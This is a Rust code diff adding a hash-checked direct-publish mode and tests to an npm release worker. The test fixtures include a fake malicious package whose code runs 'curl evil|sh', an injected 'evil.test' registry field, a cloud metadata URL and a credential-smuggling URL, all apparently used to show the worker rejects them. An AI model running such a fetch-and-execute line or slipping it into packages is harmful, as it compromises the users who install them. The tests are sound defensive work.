@@ -1,9 +1,14 @@
 //! Keyturn worker for npm.
 //!
-//! Given a staged package and the hash a quorum approved, the worker checks
-//! that the staged tarball is byte for byte what was approved, approves it on
-//! the registry with the bot credentials, and then checks the published
-//! tarball again.
+//! Two modes, both bound to the hash a quorum approved:
+//!
+//! * `run`          approves a package that CI staged (`npm stage publish`).
+//!                  This needs a one-time password and so only works for
+//!                  accounts that still have an authenticator app.
+//! * `run_publish`  downloads the artifact from a URL, checks it against the
+//!                  approved hash, and publishes it with a granular token.
+//!
+//! In both modes the worker checks the published tarball again afterwards.
 //!
 //! The registry base URL is deliberately not part of the input. The input
 //! comes from the contract request, and the credentials must never be sent to
@@ -13,13 +18,17 @@
 pub mod http;
 pub mod totp;
 
+use data_encoding::{BASE64, HEXLOWER};
 use http::{Http, Response};
 use serde::{Deserialize, Serialize};
-use sha2::{Digest, Sha256};
+use sha1::Sha1;
+use sha2::{Digest, Sha256, Sha512};
 use std::io::Read;
+use std::time::Duration;
 
 pub const DEFAULT_REGISTRY: &str = "https://registry.npmjs.org";
 
+/// Staged mode request.
 #[derive(Deserialize, Debug, Clone)]
 #[serde(deny_unknown_fields)]
 pub struct Input {
@@ -30,9 +39,33 @@ pub struct Input {
     pub approved_hash: String,
 }
 
+/// Direct publish mode request.
+#[derive(Deserialize, Debug, Clone)]
+#[serde(deny_unknown_fields)]
+pub struct PublishInput {
+    pub package: String,
+    pub version: String,
+    pub approved_hash: String,
+    /// Where to fetch the tarball. Any location works, the hash decides.
+    pub artifact_url: String,
+}
+
 pub struct Secrets {
     pub token: String,
     pub totp_secret: String,
+}
+
+pub struct PublishOptions {
+    /// Allow plain http artifact URLs. Operators set this for local mocks only.
+    pub allow_http_artifacts: bool,
+    pub post_check_attempts: u32,
+    pub post_check_delay_ms: u64,
+}
+
+impl Default for PublishOptions {
+    fn default() -> Self {
+        Self { allow_http_artifacts: false, post_check_attempts: 5, post_check_delay_ms: 2000 }
+    }
 }
 
 #[derive(Serialize, Debug, PartialEq, Eq)]
@@ -48,13 +81,13 @@ impl Output {
         Self { ok: true, published_hash: Some(hash), error: None, detail: None }
     }
 
-    fn failure(error: &str, detail: impl Into<String>) -> Self {
+    pub fn failure(error: &str, detail: impl Into<String>) -> Self {
         Self { ok: false, published_hash: None, error: Some(error.to_string()), detail: Some(detail.into()) }
     }
 }
 
 fn sha256_hex(bytes: &[u8]) -> String {
-    data_encoding::HEXLOWER.encode(&Sha256::digest(bytes))
+    HEXLOWER.encode(&Sha256::digest(bytes))
 }
 
 fn is_uuid(s: &str) -> bool {
@@ -93,8 +126,24 @@ fn valid_version(v: &str) -> bool {
         && v.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'+'))
 }
 
-/// Read name and version from `package/package.json` inside an npm tarball.
-fn manifest_of(tarball: &[u8]) -> Result<(String, String), String> {
+fn artifact_url_ok(url: &str, allow_http: bool) -> bool {
+    let rest = match url.strip_prefix("https://") {
+        Some(r) => r,
+        None if allow_http => match url.strip_prefix("http://") {
+            Some(r) => r,
+            None => return false,
+        },
+        None => return false,
+    };
+    let authority = rest.split(['/', '?', '#']).next().unwrap_or("");
+    url.len() <= 2048
+        && url.bytes().all(|b| b.is_ascii_graphic())
+        && !authority.is_empty()
+        && !authority.contains('@')
+}
+
+/// Read the whole `package/package.json` from an npm tarball.
+fn manifest_json(tarball: &[u8]) -> Result<serde_json::Value, String> {
     let gz = flate2::read::GzDecoder::new(tarball);
     let mut archive = tar::Archive::new(gz);
     let entries = archive.entries().map_err(|_| "tarball is not a readable archive".to_string())?;
@@ -108,36 +157,123 @@ fn manifest_of(tarball: &[u8]) -> Result<(String, String), String> {
                 .take(1024 * 1024)
                 .read_to_string(&mut text)
                 .map_err(|_| "package.json is not valid text".to_string())?;
-            let json: serde_json::Value =
-                serde_json::from_str(&text).map_err(|_| "package.json is not valid JSON".to_string())?;
-            let name = json.get("name").and_then(|v| v.as_str()).unwrap_or_default().to_string();
-            let version = json.get("version").and_then(|v| v.as_str()).unwrap_or_default().to_string();
-            return Ok((name, version));
+            return serde_json::from_str(&text).map_err(|_| "package.json is not valid JSON".to_string());
         }
     }
     Err("package/package.json is missing from the tarball".to_string())
 }
 
-fn auth_headers<'a>(token: &'a str) -> [(&'a str, &'a str); 1] {
-    [("authorization", token)]
+fn manifest_matches(tarball: &[u8], package: &str, version: &str) -> Result<(), Output> {
+    match manifest_json(tarball) {
+        Ok(json) => {
+            let name = json.get("name").and_then(|v| v.as_str()).unwrap_or_default();
+            let ver = json.get("version").and_then(|v| v.as_str()).unwrap_or_default();
+            if name == package && ver == version {
+                Ok(())
+            } else {
+                Err(Output::failure(
+                    "manifest_mismatch",
+                    format!("tarball declares {}@{}, expected {}@{}", name, ver, package, version),
+                ))
+            }
+        }
+        Err(e) => Err(Output::failure("manifest_mismatch", e)),
+    }
 }
 
 fn ok_status(r: &Response) -> bool {
     (200..300).contains(&r.status)
 }
 
+fn registry_error(r: &Response) -> String {
+    let message = serde_json::from_slice::<serde_json::Value>(&r.body)
+        .ok()
+        .and_then(|v| v.get("error").and_then(|e| e.as_str()).map(|s| s.chars().take(160).collect::<String>()));
+    match message {
+        Some(m) => format!("registry answered {}: {}", r.status, m),
+        None => format!("registry answered {}", r.status),
+    }
+}
+
+/// Look up the published version, download its tarball and compare the hash.
+fn verify_published(
+    http: &dyn Http,
+    base: &str,
+    package: &str,
+    version: &str,
+    approved_hash: &str,
+    attempts: u32,
+    delay_ms: u64,
+) -> Output {
+    let encoded = package.replacen('/', "%2f", 1);
+    let meta_url = format!("{}/{}/{}", base, encoded, version);
+    let mut last = Output::failure("post_check_failed", "no attempt was made");
+    for attempt in 0..attempts.max(1) {
+        if attempt > 0 && delay_ms > 0 {
+            std::thread::sleep(Duration::from_millis(delay_ms));
+        }
+        let meta = match http.get(&meta_url, &[]) {
+            Ok(r) if ok_status(&r) => r.body,
+            Ok(r) => {
+                last = Output::failure("post_check_failed", format!("version lookup answered {}", r.status));
+                continue;
+            }
+            Err(e) => {
+                last = Output::failure("post_check_failed", e);
+                continue;
+            }
+        };
+        let href = serde_json::from_slice::<serde_json::Value>(&meta)
+            .ok()
+            .and_then(|v| v.pointer("/dist/tarball").and_then(|t| t.as_str()).map(str::to_string));
+        let Some(href) = href else {
+            last = Output::failure("post_check_failed", "published version has no tarball address");
+            continue;
+        };
+        let published = match http.get(&href, &[]) {
+            Ok(r) if ok_status(&r) => r.body,
+            Ok(r) => {
+                last = Output::failure("post_check_failed", format!("tarball download answered {}", r.status));
+                continue;
+            }
+            Err(e) => {
+                last = Output::failure("post_check_failed", e);
+                continue;
+            }
+        };
+        let published_hash = sha256_hex(&published);
+        if published_hash == approved_hash {
+            return Output::success(published_hash);
+        }
+        // A different tarball is not a timing problem, so do not retry.
+        return Output::failure(
+            "post_check_failed",
+            format!("published tarball hash {} differs from the approved hash", published_hash),
+        );
+    }
+    last
+}
+
+fn check_common(package: &str, version: &str, hash: &str) -> Option<Output> {
+    if !is_sha256_hex(hash) {
+        return Some(Output::failure("bad_input", "approved_hash must be 64 lowercase hex characters"));
+    }
+    if !valid_package_name(package) {
+        return Some(Output::failure("bad_input", "package name is not a valid npm name"));
+    }
+    if !valid_version(version) {
+        return Some(Output::failure("bad_input", "version contains unexpected characters"));
+    }
+    None
+}
+
+/// Staged mode: approve what CI staged, if it is what the quorum approved.
 pub fn run(input: &Input, secrets: &Secrets, registry: &str, http: &dyn Http, now_unix: u64) -> Output {
     if !is_uuid(&input.stage_id) {
         return Output::failure("bad_input", "stage_id is not a UUID");
     }
-    if !is_sha256_hex(&input.approved_hash) {
-        return Output::failure("bad_input", "approved_hash must be 64 lowercase hex characters");
-    }
-    if !valid_package_name(&input.package) {
-        return Output::failure("bad_input", "package name is not a valid npm name");
-    }
-    if !valid_version(&input.version) {
-        return Output::failure("bad_input", "version contains unexpected characters");
+    if let Some(bad) = check_common(&input.package, &input.version, &input.approved_hash) {
+        return bad;
     }
 
     let base = registry.trim_end_matches('/');
@@ -145,7 +281,7 @@ pub fn run(input: &Input, secrets: &Secrets, registry: &str, http: &dyn Http, no
 
     // 1. Fetch the staged tarball and compare it with what the quorum approved.
     let tarball_url = format!("{}/-/stage/{}/tarball", base, input.stage_id);
-    let staged = match http.get(&tarball_url, &auth_headers(&bearer)) {
+    let staged = match http.get(&tarball_url, &[("authorization", bearer.as_str())]) {
         Ok(r) if ok_status(&r) => r.body,
         Ok(r) if r.status == 404 => return Output::failure("stage_not_found", "the staged package does not exist"),
         Ok(r) => return Output::failure("stage_fetch_failed", format!("registry answered {}", r.status)),
@@ -160,15 +296,8 @@ pub fn run(input: &Input, secrets: &Secrets, registry: &str, http: &dyn Http, no
     }
 
     // 2. The approved bytes must also be the package and version we expect.
-    match manifest_of(&staged) {
-        Ok((name, version)) if name == input.package && version == input.version => {}
-        Ok((name, version)) => {
-            return Output::failure(
-                "manifest_mismatch",
-                format!("tarball declares {}@{}, expected {}@{}", name, version, input.package, input.version),
-            )
-        }
-        Err(e) => return Output::failure("manifest_mismatch", e),
+    if let Err(out) = manifest_matches(&staged, &input.package, &input.version) {
+        return out;
     }
 
     // 3. Approve on the registry with the bot credentials and a fresh one-time code.
@@ -185,32 +314,107 @@ pub fn run(input: &Input, secrets: &Secrets, registry: &str, http: &dyn Http, no
     }
 
     // 4. Check what was actually published.
-    let encoded = input.package.replacen('/', "%2f", 1);
-    let meta_url = format!("{}/{}/{}", base, encoded, input.version);
-    let meta = match http.get(&meta_url, &[]) {
+    verify_published(http, base, &input.package, &input.version, &input.approved_hash, 1, 0)
+}
+
+/// The JSON body npm expects for `PUT /<package>`, the same shape libnpmpublish builds.
+fn publish_body(base: &str, name: &str, version: &str, tarball: &[u8], manifest: &serde_json::Value) -> Result<Vec<u8>, String> {
+    let mut version_doc = manifest.as_object().cloned().ok_or("package.json is not an object")?;
+    let tarball_name = format!("{}-{}.tgz", name, version);
+    let tarball_uri = format!("{}/-/{}", name, tarball_name);
+    let dist = serde_json::json!({
+        "shasum": HEXLOWER.encode(&Sha1::digest(tarball)),
+        "integrity": format!("sha512-{}", BASE64.encode(&Sha512::digest(tarball))),
+        "tarball": format!("{}/{}", base.replacen("https://", "http://", 1), tarball_uri),
+    });
+    version_doc.insert("_id".into(), format!("{}@{}", name, version).into());
+    version_doc.insert("name".into(), name.into());
+    version_doc.insert("version".into(), version.into());
+    version_doc.insert("dist".into(), dist);
+
+    let mut root = serde_json::json!({
+        "_id": name,
+        "name": name,
+        "dist-tags": { "latest": version },
+        "versions": { version: serde_json::Value::Object(version_doc) },
+        "_attachments": {
+            tarball_name: {
+                "content_type": "application/octet-stream",
+                "data": BASE64.encode(tarball),
+                "length": tarball.len(),
+            }
+        },
+    });
+    if let Some(desc) = manifest.get("description") {
+        root["description"] = desc.clone();
+    }
+    if name.starts_with('@') {
+        root["access"] = "public".into();
+    }
+    serde_json::to_vec(&root).map_err(|_| "could not build the publish request".to_string())
+}
+
+/// Direct publish mode: fetch the artifact, check it against the approved hash, publish it.
+pub fn run_publish(input: &PublishInput, secrets: &Secrets, registry: &str, http: &dyn Http, opts: &PublishOptions) -> Output {
+    if let Some(bad) = check_common(&input.package, &input.version, &input.approved_hash) {
+        return bad;
+    }
+    if !artifact_url_ok(&input.artifact_url, opts.allow_http_artifacts) {
+        return Output::failure("bad_input", "artifact_url must be an https URL without credentials");
+    }
+    let base = registry.trim_end_matches('/');
+
+    // 1. Fetch the artifact without credentials and compare it with the approved hash.
+    let artifact = match http.fetch_public(&input.artifact_url) {
         Ok(r) if ok_status(&r) => r.body,
-        Ok(r) => return Output::failure("post_check_failed", format!("version lookup answered {}", r.status)),
-        Err(e) => return Output::failure("post_check_failed", e),
+        Ok(r) => return Output::failure("artifact_fetch_failed", format!("artifact host answered {}", r.status)),
+        Err(e) => return Output::failure("artifact_fetch_failed", e),
     };
-    let tarball_href = serde_json::from_slice::<serde_json::Value>(&meta)
-        .ok()
-        .and_then(|v| v.pointer("/dist/tarball").and_then(|t| t.as_str()).map(str::to_string));
-    let Some(href) = tarball_href else {
-        return Output::failure("post_check_failed", "published version has no tarball address");
-    };
-    let published = match http.get(&href, &[]) {
-        Ok(r) if ok_status(&r) => r.body,
-        Ok(r) => return Output::failure("post_check_failed", format!("tarball download answered {}", r.status)),
-        Err(e) => return Output::failure("post_check_failed", e),
-    };
-    let published_hash = sha256_hex(&published);
-    if published_hash != input.approved_hash {
+    let actual = sha256_hex(&artifact);
+    if actual != input.approved_hash {
         return Output::failure(
-            "post_check_failed",
-            format!("published tarball hash {} differs from the approved hash", published_hash),
+            "hash_mismatch",
+            format!("artifact hash {} differs from the approved hash {}", actual, input.approved_hash),
         );
     }
-    Output::success(published_hash)
+
+    // 2. The approved bytes must be the package and version we expect.
+    if let Err(out) = manifest_matches(&artifact, &input.package, &input.version) {
+        return out;
+    }
+    let manifest = match manifest_json(&artifact) {
+        Ok(m) => m,
+        Err(e) => return Output::failure("manifest_mismatch", e),
+    };
+
+    // 3. Publish with the token.
+    let body = match publish_body(base, &input.package, &input.version, &artifact, &manifest) {
+        Ok(b) => b,
+        Err(e) => return Output::failure("publish_failed", e),
+    };
+    let url = format!("{}/{}", base, input.package.replacen('/', "%2f", 1));
+    let bearer = format!("Bearer {}", secrets.token);
+    let headers = [
+        ("authorization", bearer.as_str()),
+        ("content-type", "application/json"),
+        ("npm-command", "publish"),
+    ];
+    match http.put(&url, &headers, &body) {
+        Ok(r) if ok_status(&r) => {}
+        Ok(r) => return Output::failure("publish_failed", registry_error(&r)),
+        Err(e) => return Output::failure("publish_failed", e),
+    }
+
+    // 4. Check what the registry now serves.
+    verify_published(
+        http,
+        base,
+        &input.package,
+        &input.version,
+        &input.approved_hash,
+        opts.post_check_attempts,
+        opts.post_check_delay_ms,
+    )
 }
 
 #[cfg(test)]
@@ -219,15 +423,16 @@ mod tests {
     use flate2::write::GzEncoder;
     use flate2::Compression;
     use std::cell::RefCell;
-    use std::collections::HashMap;
+    use std::collections::{HashMap, VecDeque};
 
     const STAGE: &str = "6f1c2d3e-4a5b-4c6d-8e7f-0a1b2c3d4e5f";
     const REG: &str = "https://registry.test";
+    const ART: &str = "https://artifacts.test/leftpad-1.0.0.tgz";
     const TOKEN: &str = "npm_botSecretToken123";
     const SECRET: &str = "GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ";
 
     fn tgz(name: &str, version: &str, filler: &str) -> Vec<u8> {
-        let manifest = format!(r#"{{"name":"{}","version":"{}"}}"#, name, version);
+        let manifest = format!(r#"{{"name":"{}","version":"{}","description":"demo"}}"#, name, version);
         let enc = GzEncoder::new(Vec::new(), Compression::default());
         let mut b = tar::Builder::new(enc);
         for (path, data) in [("package/package.json", manifest.as_str()), ("package/index.js", filler)] {
@@ -240,54 +445,66 @@ mod tests {
         b.into_inner().unwrap().finish().unwrap()
     }
 
+    type Call = (String, String, Vec<(String, String)>, Vec<u8>);
+
+    /// In-memory registry. A route can hold several answers, used in order,
+    /// with the last one repeating.
     #[derive(Default)]
     struct Fake {
-        routes: HashMap<(String, String), (u16, Vec<u8>)>,
-        calls: RefCell<Vec<(String, String, Vec<(String, String)>)>>,
+        routes: RefCell<HashMap<(String, String), VecDeque<(u16, Vec<u8>)>>>,
+        calls: RefCell<Vec<Call>>,
     }
 
     impl Fake {
-        fn route(mut self, method: &str, url: &str, status: u16, body: Vec<u8>) -> Self {
-            self.routes.insert((method.to_string(), url.to_string()), (status, body));
+        fn route(self, method: &str, url: &str, status: u16, body: Vec<u8>) -> Self {
+            self.routes
+                .borrow_mut()
+                .entry((method.to_string(), url.to_string()))
+                .or_default()
+                .push_back((status, body));
             self
         }
 
-        fn record(&self, method: &str, url: &str, headers: &[(&str, &str)]) {
-            let h = headers.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect();
-            self.calls.borrow_mut().push((method.to_string(), url.to_string(), h));
+        fn replace(self, method: &str, url: &str, status: u16, body: Vec<u8>) -> Self {
+            self.routes.borrow_mut().remove(&(method.to_string(), url.to_string()));
+            self.route(method, url, status, body)
         }
 
-        fn answer(&self, method: &str, url: &str) -> Result<Response, String> {
-            match self.routes.get(&(method.to_string(), url.to_string())) {
-                Some((status, body)) => Ok(Response { status: *status, body: body.clone() }),
+        fn answer(&self, method: &str, url: &str, headers: &[(&str, &str)], body: &[u8]) -> Result<Response, String> {
+            let h = headers.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect();
+            self.calls.borrow_mut().push((method.to_string(), url.to_string(), h, body.to_vec()));
+            let mut routes = self.routes.borrow_mut();
+            match routes.get_mut(&(method.to_string(), url.to_string())) {
+                Some(q) => {
+                    let (status, body) = if q.len() > 1 { q.pop_front().unwrap() } else { q.front().unwrap().clone() };
+                    Ok(Response { status, body })
+                }
                 None => Ok(Response { status: 404, body: vec![] }),
             }
         }
 
-        fn posted(&self) -> usize {
-            self.calls.borrow().iter().filter(|c| c.0 == "POST").count()
+        fn count(&self, method: &str) -> usize {
+            self.calls.borrow().iter().filter(|c| c.0 == method).count()
         }
     }
 
     impl Http for Fake {
         fn get(&self, url: &str, headers: &[(&str, &str)]) -> Result<Response, String> {
-            self.record("GET", url, headers);
-            self.answer("GET", url)
+            self.answer("GET", url, headers, &[])
         }
-
-        fn post(&self, url: &str, headers: &[(&str, &str)], _body: &[u8]) -> Result<Response, String> {
-            self.record("POST", url, headers);
-            self.answer("POST", url)
+        fn post(&self, url: &str, headers: &[(&str, &str)], body: &[u8]) -> Result<Response, String> {
+            self.answer("POST", url, headers, body)
+        }
+        fn put(&self, url: &str, headers: &[(&str, &str)], body: &[u8]) -> Result<Response, String> {
+            self.answer("PUT", url, headers, body)
+        }
+        fn fetch_public(&self, url: &str) -> Result<Response, String> {
+            self.answer("PUBLIC", url, &[], &[])
         }
     }
 
     fn input(hash: &str) -> Input {
-        Input {
-            stage_id: STAGE.into(),
-            package: "leftpad".into(),
-            version: "1.0.0".into(),
-            approved_hash: hash.into(),
-        }
+        Input { stage_id: STAGE.into(), package: "leftpad".into(), version: "1.0.0".into(), approved_hash: hash.into() }
     }
 
     fn secrets() -> Secrets {
@@ -303,6 +520,8 @@ mod tests {
             .route("GET", &format!("{}/leftpad/-/leftpad-1.0.0.tgz", REG), 200, published)
     }
 
+    // ----- staged mode -----
+
     #[test]
     fn publishes_exactly_what_was_approved() {
         let bytes = tgz("leftpad", "1.0.0", "module.exports = 1");
@@ -316,9 +535,7 @@ mod tests {
         let header = |name: &str| approve.2.iter().find(|h| h.0 == name).map(|h| h.1.clone());
         assert_eq!(header("authorization").as_deref(), Some("Bearer npm_botSecretToken123"));
         assert_eq!(header("npm-otp").as_deref(), Some("287082"));
-        // The published tarball is fetched without credentials.
-        let last = calls.last().unwrap();
-        assert!(last.2.is_empty());
+        assert!(calls.last().unwrap().2.is_empty(), "the published tarball is fetched without credentials");
     }
 
     #[test]
@@ -330,7 +547,7 @@ mod tests {
         let out = run(&input(&hash), &secrets(), REG, &http, 59);
         assert!(!out.ok);
         assert_eq!(out.error.as_deref(), Some("hash_mismatch"));
-        assert_eq!(http.posted(), 0, "nothing may be approved on a mismatch");
+        assert_eq!(http.count("POST"), 0, "nothing may be approved on a mismatch");
     }
 
     #[test]
@@ -340,7 +557,7 @@ mod tests {
         let http = registry_with(bytes.clone(), bytes);
         let out = run(&input(&hash), &secrets(), REG, &http, 59);
         assert_eq!(out.error.as_deref(), Some("manifest_mismatch"));
-        assert_eq!(http.posted(), 0);
+        assert_eq!(http.count("POST"), 0);
     }
 
     #[test]
@@ -350,7 +567,7 @@ mod tests {
         let http = registry_with(bytes.clone(), bytes);
         let out = run(&input(&hash), &secrets(), REG, &http, 59);
         assert_eq!(out.error.as_deref(), Some("manifest_mismatch"));
-        assert_eq!(http.posted(), 0);
+        assert_eq!(http.count("POST"), 0);
     }
 
     #[test]
@@ -358,7 +575,7 @@ mod tests {
         let bytes = tgz("leftpad", "1.0.0", "module.exports = 1");
         let hash = sha256_hex(&bytes);
         let http = registry_with(bytes.clone(), bytes)
-            .route("POST", &format!("{}/-/stage/{}/approve", REG, STAGE), 401, vec![]);
+            .replace("POST", &format!("{}/-/stage/{}/approve", REG, STAGE), 401, vec![]);
         let out = run(&input(&hash), &secrets(), REG, &http, 59);
         assert_eq!(out.error.as_deref(), Some("approve_failed"));
     }
@@ -423,6 +640,12 @@ mod tests {
             "a".repeat(64)
         );
         assert!(serde_json::from_str::<Input>(&raw).is_err());
+        let raw = format!(
+            r#"{{"package":"leftpad","version":"1.0.0","approved_hash":"{}","artifact_url":"{}","registry_url":"https://evil.test"}}"#,
+            "a".repeat(64),
+            ART
+        );
+        assert!(serde_json::from_str::<PublishInput>(&raw).is_err());
     }
 
     #[test]
@@ -430,9 +653,172 @@ mod tests {
         let bytes = tgz("leftpad", "1.0.0", "x");
         let hash = sha256_hex(&bytes);
         let http = registry_with(bytes.clone(), bytes)
-            .route("POST", &format!("{}/-/stage/{}/approve", REG, STAGE), 401, vec![]);
+            .replace("POST", &format!("{}/-/stage/{}/approve", REG, STAGE), 401, vec![]);
         let out = serde_json::to_string(&run(&input(&hash), &secrets(), REG, &http, 59)).unwrap();
         assert!(!out.contains(TOKEN));
         assert!(!out.contains(SECRET));
+    }
+
+    // ----- direct publish mode -----
+
+    fn pinput(hash: &str) -> PublishInput {
+        PublishInput { package: "leftpad".into(), version: "1.0.0".into(), approved_hash: hash.into(), artifact_url: ART.into() }
+    }
+
+    fn fast() -> PublishOptions {
+        PublishOptions { allow_http_artifacts: false, post_check_attempts: 3, post_check_delay_ms: 0 }
+    }
+
+    fn publish_registry(artifact: Vec<u8>, published: Vec<u8>) -> Fake {
+        let meta = format!(r#"{{"dist":{{"tarball":"{}/leftpad/-/leftpad-1.0.0.tgz"}}}}"#, REG);
+        Fake::default()
+            .route("PUBLIC", ART, 200, artifact)
+            .route("PUT", &format!("{}/leftpad", REG), 200, b"{\"ok\":true}".to_vec())
+            .route("GET", &format!("{}/leftpad/1.0.0", REG), 200, meta.into_bytes())
+            .route("GET", &format!("{}/leftpad/-/leftpad-1.0.0.tgz", REG), 200, published)
+    }
+
+    #[test]
+    fn publish_sends_the_approved_bytes_in_the_npm_format() {
+        let bytes = tgz("leftpad", "1.0.0", "module.exports = 1");
+        let hash = sha256_hex(&bytes);
+        let http = publish_registry(bytes.clone(), bytes.clone());
+        let out = run_publish(&pinput(&hash), &secrets(), REG, &http, &fast());
+        assert_eq!(out, Output::success(hash));
+
+        let calls = http.calls.borrow();
+        let artifact = calls.iter().find(|c| c.0 == "PUBLIC").unwrap();
+        assert!(artifact.2.is_empty(), "the artifact is fetched without credentials");
+
+        let put = calls.iter().find(|c| c.0 == "PUT").unwrap();
+        let header = |n: &str| put.2.iter().find(|h| h.0 == n).map(|h| h.1.clone());
+        assert_eq!(header("authorization").as_deref(), Some("Bearer npm_botSecretToken123"));
+        assert_eq!(header("content-type").as_deref(), Some("application/json"));
+
+        let body: serde_json::Value = serde_json::from_slice(&put.3).unwrap();
+        assert_eq!(body["name"], "leftpad");
+        assert_eq!(body["dist-tags"]["latest"], "1.0.0");
+        let v = &body["versions"]["1.0.0"];
+        assert_eq!(v["_id"], "leftpad@1.0.0");
+        assert_eq!(v["description"], "demo");
+        assert_eq!(v["dist"]["shasum"], HEXLOWER.encode(&Sha1::digest(&bytes)));
+        assert_eq!(v["dist"]["integrity"], format!("sha512-{}", BASE64.encode(&Sha512::digest(&bytes))));
+        let att = &body["_attachments"]["leftpad-1.0.0.tgz"];
+        assert_eq!(att["length"], bytes.len());
+        assert_eq!(BASE64.decode(att["data"].as_str().unwrap().as_bytes()).unwrap(), bytes);
+        assert!(body.get("access").is_none(), "unscoped packages carry no access field");
+    }
+
+    #[test]
+    fn publish_scoped_package_is_public_and_encoded() {
+        let bytes = tgz("@acme/util", "2.0.0", "x");
+        let hash = sha256_hex(&bytes);
+        let meta = format!(r#"{{"dist":{{"tarball":"{}/dl.tgz"}}}}"#, REG);
+        let http = Fake::default()
+            .route("PUBLIC", ART, 200, bytes.clone())
+            .route("PUT", &format!("{}/@acme%2futil", REG), 201, vec![])
+            .route("GET", &format!("{}/@acme%2futil/2.0.0", REG), 200, meta.into_bytes())
+            .route("GET", &format!("{}/dl.tgz", REG), 200, bytes.clone());
+        let mut i = pinput(&hash);
+        i.package = "@acme/util".into();
+        i.version = "2.0.0".into();
+        assert!(run_publish(&i, &secrets(), REG, &http, &fast()).ok);
+        let calls = http.calls.borrow();
+        let put = calls.iter().find(|c| c.0 == "PUT").unwrap();
+        let body: serde_json::Value = serde_json::from_slice(&put.3).unwrap();
+        assert_eq!(body["access"], "public");
+        assert!(body["_attachments"].get("@acme/util-2.0.0.tgz").is_some());
+        assert_eq!(body["versions"]["2.0.0"]["dist"]["tarball"], "http://registry.test/@acme/util/-/@acme/util-2.0.0.tgz");
+    }
+
+    #[test]
+    fn publish_refuses_an_artifact_that_differs_from_the_approval() {
+        let approved = tgz("leftpad", "1.0.0", "module.exports = 1");
+        let evil = tgz("leftpad", "1.0.0", "require('child_process').exec('curl evil|sh')");
+        let hash = sha256_hex(&approved);
+        let http = publish_registry(evil.clone(), evil);
+        let out = run_publish(&pinput(&hash), &secrets(), REG, &http, &fast());
+        assert_eq!(out.error.as_deref(), Some("hash_mismatch"));
+        assert_eq!(http.count("PUT"), 0, "nothing may be published on a mismatch");
+    }
+
+    #[test]
+    fn publish_refuses_an_artifact_for_another_version() {
+        let bytes = tgz("leftpad", "9.9.9", "x");
+        let hash = sha256_hex(&bytes);
+        let http = publish_registry(bytes.clone(), bytes);
+        let out = run_publish(&pinput(&hash), &secrets(), REG, &http, &fast());
+        assert_eq!(out.error.as_deref(), Some("manifest_mismatch"));
+        assert_eq!(http.count("PUT"), 0);
+    }
+
+    #[test]
+    fn publish_reports_the_registry_error_without_secrets() {
+        let bytes = tgz("leftpad", "1.0.0", "x");
+        let hash = sha256_hex(&bytes);
+        let http = publish_registry(bytes.clone(), bytes).replace(
+            "PUT",
+            &format!("{}/leftpad", REG),
+            403,
+            br#"{"error":"You cannot publish over the previously published versions: 1.0.0."}"#.to_vec(),
+        );
+        let out = run_publish(&pinput(&hash), &secrets(), REG, &http, &fast());
+        assert_eq!(out.error.as_deref(), Some("publish_failed"));
+        let text = out.detail.clone().unwrap();
+        assert!(text.contains("403") && text.contains("previously published"));
+        assert!(!serde_json::to_string(&out).unwrap().contains(TOKEN));
+    }
+
+    #[test]
+    fn publish_post_check_waits_for_the_registry_to_catch_up() {
+        let bytes = tgz("leftpad", "1.0.0", "x");
+        let hash = sha256_hex(&bytes);
+        let http = publish_registry(bytes.clone(), bytes).replace("GET", &format!("{}/leftpad/1.0.0", REG), 404, vec![]);
+        // Add the successful answer after two misses.
+        let meta = format!(r#"{{"dist":{{"tarball":"{}/leftpad/-/leftpad-1.0.0.tgz"}}}}"#, REG);
+        let http = http
+            .route("GET", &format!("{}/leftpad/1.0.0", REG), 404, vec![])
+            .route("GET", &format!("{}/leftpad/1.0.0", REG), 200, meta.into_bytes());
+        let out = run_publish(&pinput(&hash), &secrets(), REG, &http, &fast());
+        assert!(out.ok, "{:?}", out);
+        assert_eq!(http.count("PUT"), 1, "it must not publish twice while retrying");
+    }
+
+    #[test]
+    fn publish_post_check_gives_up_after_the_attempts() {
+        let bytes = tgz("leftpad", "1.0.0", "x");
+        let hash = sha256_hex(&bytes);
+        let http = publish_registry(bytes.clone(), bytes).replace("GET", &format!("{}/leftpad/1.0.0", REG), 404, vec![]);
+        let out = run_publish(&pinput(&hash), &secrets(), REG, &http, &fast());
+        assert_eq!(out.error.as_deref(), Some("post_check_failed"));
+    }
+
+    #[test]
+    fn publish_flags_a_registry_that_serves_different_bytes() {
+        let bytes = tgz("leftpad", "1.0.0", "x");
+        let other = tgz("leftpad", "1.0.0", "y");
+        let hash = sha256_hex(&bytes);
+        let http = publish_registry(bytes, other);
+        let out = run_publish(&pinput(&hash), &secrets(), REG, &http, &fast());
+        assert_eq!(out.error.as_deref(), Some("post_check_failed"));
+        assert_eq!(http.count("GET"), 2, "a different tarball is not retried");
+    }
+
+    #[test]
+    fn artifact_urls_are_restricted() {
+        assert!(artifact_url_ok("https://github.com/o/r/releases/download/v1/a.tgz", false));
+        assert!(!artifact_url_ok("http://example.com/a.tgz", false));
+        assert!(artifact_url_ok("http://127.0.0.1:8080/a.tgz", true));
+        assert!(!artifact_url_ok("ftp://example.com/a.tgz", true));
+        assert!(!artifact_url_ok("https://user:pw@example.com/a.tgz", false));
+        assert!(!artifact_url_ok("https://example.com@evil.test/a.tgz", false));
+        assert!(!artifact_url_ok("https:///a.tgz", false));
+        assert!(!artifact_url_ok("https://exa mple.com/a.tgz", false));
+        let http = Fake::default();
+        let mut i = pinput(&"a".repeat(64));
+        i.artifact_url = "http://169.254.169.254/latest".into();
+        let out = run_publish(&i, &secrets(), REG, &http, &fast());
+        assert_eq!(out.error.as_deref(), Some("bad_input"));
+        assert!(http.calls.borrow().is_empty());
     }
 }
